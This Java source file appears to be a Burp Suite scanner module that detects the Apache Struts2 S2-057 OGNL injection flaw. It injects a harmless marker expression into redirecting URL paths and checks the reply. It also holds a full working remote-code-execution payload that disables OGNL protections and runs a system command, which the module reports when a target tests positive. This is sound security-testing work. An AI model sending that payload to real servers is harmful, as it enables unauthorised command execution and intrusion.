package module;

import burp.IModule;
import burp.IResponseInfo;
import burp.IScanIssue;

import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;

public class S2_057 extends IModule {
    public S2_057() {
        poc =
            "${'"+injectMark[0]+"'+'"+injectMark[1]+"'}";
        poc = URLEncoder.encode(poc);

        exp =
            "${" +
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
            ".(#ct=#request['struts.valueStack'].context)" +
            ".(#cr=#ct['com.opensymphony.xwork2.ActionContext.container'])" +
            ".(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" +
            ".(#ou.getExcludedPackageNames().clear())" +
            ".(#ou.getExcludedClasses().clear())" +
            ".(#ct.setMemberAccess(#dm))" +
            ".(#a=@java.lang.Runtime@getRuntime().exec('whoami'))" +
            ".(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))" +
            "}";
        exp = URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        byte[] response = iHttpRequestResponse.getResponse();
        IResponseInfo iResponseInfo = helpers.analyzeResponse(response);
        short statusCode = iResponseInfo.getStatusCode();
        //仅对跳转页面进行判断
        if (statusCode == 302) {
            List<String> headers = requestInfo.getHeaders();
            int bodyOffset = requestInfo.getBodyOffset();
            byte[] requestBody = Arrays.copyOfRange(request, bodyOffset, request.length);
            String path = requestInfo.getUrl().getPath();
            String[] strings = path.split("/");
            String newPath = path.replace(strings[strings.length - 1], poc + "/" + strings[strings.length - 1]);

            headers.set(0, headers.get(0).replace(path, newPath));
            try {
                request = helpers.buildHttpMessage(headers, requestBody);
                if (check()) {
                    this.detail = exp;
                    return creatCustomScanIssue();
                }
            } catch (Exception e) {
                callbacks.printError(e.getMessage());
            }
        }
        return super.start();
    }
}
